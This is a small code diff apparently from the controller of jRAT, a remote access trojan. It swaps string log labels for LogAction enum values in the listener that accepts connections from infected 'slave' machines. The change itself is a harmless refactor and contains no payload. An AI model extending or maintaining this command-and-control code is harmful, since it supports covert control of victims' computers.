@@ -4,6 +4,7 @@ import java.net.Socket;
 
 import se.jrat.common.ConnectionCodes;
 import se.jrat.controller.AbstractSlave;
+import se.jrat.controller.LogAction;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.android.AndroidSlave;
@@ -35,14 +36,14 @@ public class ServerListener extends PortListener implements Runnable {
 
 				if (type < 0 || type > 1) {
 					slave = new Slave(this, socket);
-					Main.instance.getPanelLog().addEntry("Error", slave, "Invalid connection type");
+					Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, "Invalid connection type");
 					continue;
 				}
 
 				if (Main.liteVersion && Main.connections.size() >= 5) {
 					slave = new Slave(this, socket);
 					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
-					Main.instance.getPanelLog().addEntry("Warning", slave, "Maximum of 5 connections reached");
+					Main.instance.getPanelLog().addEntry(LogAction.WARNING, slave, "Maximum of 5 connections reached");
 					continue;
 				}
 			} catch (Exception ex) {
